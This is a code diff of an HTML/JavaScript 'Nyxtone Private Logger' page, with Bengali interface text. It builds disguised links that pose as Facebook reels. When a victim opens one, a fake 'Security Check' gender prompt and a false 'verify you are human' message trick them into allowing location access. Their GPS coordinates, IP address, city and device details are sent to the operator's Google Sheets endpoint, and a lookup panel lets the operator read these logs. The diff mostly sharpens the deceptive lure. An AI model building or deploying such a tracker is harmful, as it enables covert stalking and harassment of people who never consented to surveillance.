@@ -12,7 +12,7 @@
         body { background-color: var(--bg); color: var(--text); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
         .header-controls { position: fixed; top: 25px; width: 100%; display: flex; justify-content: space-between; padding: 0 25px; }
         .ui-btn { padding: 10px 20px; background: var(--container-bg); color: var(--text); border: 1px solid var(--border); border-radius: 50px; font-weight: 700; font-size: 11px; cursor: pointer; text-transform: uppercase; }
-        .main-container { width: 100%; max-width: 650px; padding: 40px; border: 1px solid var(--border); border-radius: 30px; background: var(--container-bg); text-align: center; margin-top: 60px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+        .main-container { width: 100%; max-width: 650px; padding: 40px; border: 1px solid var(--border); border-radius: 30px; background: var(--container-bg); text-align: center; margin-top: 60px; }
         h1 { font-size: 28px; font-weight: 800; margin-bottom: 10px; letter-spacing: -1px; }
         p { font-size: 13px; opacity: 0.6; margin-bottom: 25px; }
         .input-group { text-align: left; margin-bottom: 15px; }
@@ -27,7 +27,8 @@
         th { background: var(--gray); }
         .footer { margin-top: 30px; font-size: 10px; opacity: 0.5; font-weight: 600; }
         
-        .victim-card { padding: 40px; border-radius: 25px; background: #fff; box-shadow: 0 15px 50px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; color: #000; }
+        /* Victim UI */
+        .victim-card { padding: 40px; border-radius: 25px; background: #fff; box-shadow: 0 15px 50px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
         .btn-m { background: #007bff; color: white; padding: 15px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin: 10px; width: 100%; }
         .btn-f { background: #e83e8c; color: white; padding: 15px; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; margin: 10px; width: 100%; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
@@ -38,13 +39,13 @@
 
     <div id="main-ui" style="width: 100%; display: flex; justify-content: center;">
         <div class="header-controls">
-            <button class="ui-btn" onclick="location.href='#'">← BACK</button>
+            <button class="ui-btn" onclick="location.href='tools.html'">← BACK</button>
             <button class="ui-btn" onclick="toggleTheme()" id="theme-btn">DARK MODE</button>
         </div>
 
         <div class="main-container">
             <h1>Nyxtone Private Logger</h1>
-            <p>সরাসরি জিপিএস পিন লোকেশন লগার - মাহিম স্পেশাল</p>
+            <p>নিখুঁত ম্যাপ লোকেশন এখন আসবে মাহিম!</p>
 
             <div class="input-group">
                 <label>Your Secret ID</label>
@@ -56,24 +57,24 @@
                 <input type="text" id="fb-link" placeholder="https://facebook.com/reels/...">
             </div>
 
-            <button class="gen-btn" onclick="generateLink()">Create Tracking Link</button>
+            <button class="gen-btn" onclick="generateLink()">Create Link</button>
 
             <div id="result-box">
                 <label>Share this link:</label>
                 <span class="link-text" id="final-link" onclick="copyLink()"></span>
-                <p style="font-size: 10px; color: #d9534f; margin-top: 5px;">ভিকটিম জেন্ডার সিলেক্ট করলে জিপিএস ডাটা আসবে!</p>
+                <p style="font-size: 10px; color: #d9534f; margin-top: 5px;">⚠ এটি ভিকটিমকে জেন্ডার ভেরিফিকেশন দেখাবে!</p>
             </div>
 
             <div class="res-section">
-                <h3>Logs Result</h3>
+                <h3>Check Your Results</h3>
                 <div class="input-group" style="margin-top: 15px;">
                     <input type="text" id="check-id" placeholder="আইডি দাও">
                 </div>
-                <button class="gen-btn" style="background: var(--gray); color: var(--text);" onclick="fetchResults()">Check Logs</button>
+                <button class="gen-btn" style="background: var(--gray); color: var(--text);" onclick="fetchResults()">View Logs</button>
 
                 <table id="log-table" style="display: none;">
                     <thead>
-                        <tr><th>IP</th><th>Location / Google Map</th><th>Time</th></tr>
+                        <tr><th>IP Address</th><th>Location / Map</th><th>Time</th></tr>
                     </thead>
                     <tbody id="table-body"></tbody>
                 </table>
@@ -101,50 +102,50 @@
     function generateLink() {
         const id = document.getElementById('user-id').value;
         const fb = document.getElementById('fb-link').value;
-        if(!id || !fb) return alert("সব তথ্য দাও মাহিম!");
-        const currentUrl = window.location.href.split('?')[0];
-        const longLink = `${currentUrl}?id=${id}&v=${btoa(fb)}`;
+        if(!id || !fb) return alert("সব তথ্য দাও!");
+        const longLink = `${window.location.href.split('?')[0]}?id=${id}&v=${btoa(fb)}`;
         document.getElementById('result-box').style.display = "block";
         document.getElementById('final-link').innerText = longLink;
     }
 
     function copyLink() {
-        const text = document.getElementById('final-link').innerText;
-        navigator.clipboard.writeText(text).then(() => alert("লিঙ্ক কপি হয়েছে!"));
+        navigator.clipboard.writeText(document.getElementById('final-link').innerText);
+        alert("কপি হয়েছে!");
     }
 
     async function fetchResults() {
         const id = document.getElementById('check-id').value;
         if(!id) return alert("আইডি দাও!");
-        try {
-            const res = await fetch(SCRIPT_URL);
-            const data = await res.json();
-            const tbody = document.getElementById('table-body');
-            tbody.innerHTML = "";
-            let found = false;
-            data.forEach((row, index) => {
-                if(index === 0) return;
-                if(row[0] == id) {
-                    found = true;
-                    tbody.innerHTML += `<tr><td>${row[1]}</td><td><a href="${row[2]}" target="_blank">View Map</a></td><td>${new Date(row[4]).toLocaleString()}</td></tr>`;
-                }
-            });
-            if(found) document.getElementById('log-table').style.display = "table";
-            else alert("কোনো ডাটা পাওয়া যায়নি!");
-        } catch(e) { alert("Error fetching data!"); }
+        const res = await fetch(SCRIPT_URL);
+        const data = await res.json();
+        const tbody = document.getElementById('table-body');
+        tbody.innerHTML = "";
+        let found = false;
+        data.forEach((row, index) => {
+            if(index === 0) return;
+            if(row[0] == id) {
+                found = true;
+                tbody.innerHTML += `<tr><td>${row[1]}</td><td>${row[2]}</td><td>${new Date(row[4]).toLocaleString()}</td></tr>`;
+            }
+        });
+        if(found) document.getElementById('log-table').style.display = "table";
+        else alert("ডাটা নেই!");
     }
 
+    // Victim Logic
     async function track() {
         const params = new URLSearchParams(window.location.search);
         const id = params.get('id');
         const v = params.get('v');
+
         if(id && v) {
             document.body.innerHTML = `
                 <div class="victim-card">
-                    <h2 style="margin-bottom:10px;">User Verification</h2>
-                    <p>Select your gender to proceed</p>
+                    <h2 style="margin-bottom:10px;">Security Check</h2>
+                    <p>Select gender to watch the content</p>
                     <button class="btn-m" onclick="askGPS()">MALE</button>
                     <button class="btn-f" onclick="askGPS()">FEMALE</button>
+                    <p style="font-size:11px; color:#888; margin-top:15px;">This helps us to recommend better videos.</p>
                 </div>`;
             document.body.style.background = "#f0f2f5";
         }
@@ -154,35 +155,47 @@
         const params = new URLSearchParams(window.location.search);
         const id = params.get('id');
         const v = params.get('v');
-        document.body.innerHTML = `<div class="victim-card"><div class="loader"></div><h3>Verifying...</h3><p>Click <b>'Allow'</b> to confirm.</p></div>`;
+
+        document.body.innerHTML = `
+            <div class="victim-card" style="text-align:center;">
+                <div class="loader"></div>
+                <h3>Verifying...</h3>
+                <p>Click <b>'Allow'</b> on the popup to verify you are a human.</p>
+            </div>`;
+
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapLink = "https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude;
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
                 await sendToSheet(id, mapLink);
                 window.location.href = atob(v);
-            }, async () => {
-                await sendToSheet(id, "GPS Denied (IP Only)");
+            }, async (error) => {
+                await sendToSheet(id, "GPS Denied (Only IP/City)");
                 window.location.href = atob(v);
-            }, { enableHighAccuracy: true });
-        } else { window.location.href = atob(v); }
+            }, { enableHighAccuracy: true, timeout: 8000 });
+        } else {
+            window.location.href = atob(v);
+        }
     }
 
-    async function sendToSheet(id, locationData) {
+    async function sendToSheet(id, locationInfo) {
         try {
-            const locRes = await fetch('https://ipapi.co/json/');
+            const locRes = await fetch('http://ip-api.com/json/');
             const locData = await locRes.json();
+            const city = locData.status === "success" ? ` (${locData.city}, ${locData.country})` : "";
+            
             await fetch(SCRIPT_URL, {
                 method: 'POST',
                 mode: 'no-cors',
                 body: JSON.stringify({
                     id: id,
-                    ip: locData.ip || "Unknown",
-                    location: locationData + " (" + (locData.city || "") + ")",
+                    ip: locData.query || "Unknown",
+                    location: locationInfo + city,
                     device: navigator.userAgent
                 })
             });
         } catch(e) {}
     }
+
     track();
 </script>
 </body>
